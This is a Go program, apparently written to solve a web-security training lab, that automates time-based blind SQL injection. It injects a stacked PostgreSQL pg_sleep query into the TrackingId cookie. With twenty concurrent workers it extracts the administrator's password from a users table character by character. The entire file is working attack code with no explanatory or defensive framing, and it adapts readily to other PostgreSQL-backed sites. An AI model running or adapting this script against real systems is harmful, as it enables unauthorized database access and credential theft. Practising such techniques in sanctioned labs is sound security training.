package main

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

// Configuration
const (
	TargetURL   = "https://0aa600bc04ff20f9da40ebdb00ef0095.web-security-academy.net/filter?category=Pets"
	HostHeader  = "0aa600bc04ff20f9da40ebdb00ef0095.web-security-academy.net"
	PasswordLen = 20
	MaxWorkers  = 20
	SleepTime   = 5 * time.Second // Duration to sleep if character matches
	Charset     = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
)

var client = &http.Client{
	Timeout: 15 * time.Second,
	Transport: &http.Transport{
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
	},
}

func main() {
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	fmt.Printf("[*] Target: %s\n", TargetURL)
	fmt.Printf("[*] Strategy: Time-Based Blind SQLi (PostgreSQL pg_sleep)\n")
	fmt.Printf("[*] Sleep Trigger: %s\n", SleepTime)

	password := make([]rune, PasswordLen)
	start := time.Now()

	for i := 1; i <= PasswordLen; i++ {
		char, found := findCharForPosition(ctx, i)
		if !found {
			fmt.Printf("\n[!] Failed to resolve character at index %d. Aborting.\n", i)
			break
		}
		password[i-1] = char
		fmt.Printf("\r[+] Found char %d/%d: %c                 \n", i, PasswordLen, char)
	}

	fmt.Println("--------------------------------------------------")
	fmt.Printf("[*] Password Discovered: %s\n", string(password))
	fmt.Printf("[*] Time Elapsed: %s\n", time.Since(start))
}

func findCharForPosition(ctx context.Context, pos int) (rune, bool) {
	posCtx, cancel := context.WithCancel(ctx)
	defer cancel()

	jobs := make(chan rune, len(Charset))
	results := make(chan rune)
	var wg sync.WaitGroup

	for w := 0; w < MaxWorkers; w++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(posCtx, pos, jobs, results)
		}()
	}

	go func() {
		for _, char := range Charset {
			select {
			case <-posCtx.Done():
				return
			case jobs <- char:
			}
		}
		close(jobs)
	}()

	go func() {
		wg.Wait()
		close(results)
	}()

	// Update UI while waiting for result
	ticker := time.NewTicker(100 * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case res, ok := <-results:
			if !ok {
				return 0, false // Channel closed, nothing found
			}
			return res, true // Found the char
		case <-ctx.Done():
			return 0, false // Main context cancelled
		case <-ticker.C:
			fmt.Printf("\r[*] Brute forcing position %d...", pos)
		}
	}
}

func worker(ctx context.Context, pos int, jobs <-chan rune, results chan<- rune) {
	for char := range jobs {
		if ctx.Err() != nil {
			return
		}

		if performAttack(ctx, pos, char) {
			select {
			case results <- char:
				return
			case <-ctx.Done():
				return
			}
		}
	}
}

// performAttack sends the payload and returns true if the server response takes longer than SleepTime
func performAttack(ctx context.Context, pos int, char rune) bool {
	// Check if password at 'pos' is 'char'. If true, sleep. Else, sleep 0.
	condition := fmt.Sprintf("substring((select password from users where username='administrator'), %d, 1)='%c'", pos, char)
	
	// We inject into the TrackingId cookie.
	// %3b is the URL encoded semicolon to stack the query or break out.
	injection := fmt.Sprintf("'%%3b SELECT CASE WHEN (%s) THEN pg_sleep(%d) ELSE pg_sleep(0) END --", condition, int(SleepTime.Seconds()))

	baseCookie := "TrackingId=0xPelamar" 
	cookieVal := baseCookie + injection

	req, err := http.NewRequestWithContext(ctx, "GET", TargetURL, nil)
	if err != nil {
		return false
	}

	req.Host = HostHeader
	req.Header.Set("Cookie", cookieVal)

	start := time.Now()
	resp, err := client.Do(req)
	
	if err != nil {
		return false 
	}
	defer resp.Body.Close()
	
	// Ensure we read the body so the connection can be reused
	io.Copy(io.Discard, resp.Body)

	// Time-Based Detection Logic
	elapsed := time.Since(start)
	
	// If the request took longer than the SleepTime (plus a small buffer if desired), it's a match
	return elapsed >= SleepTime
}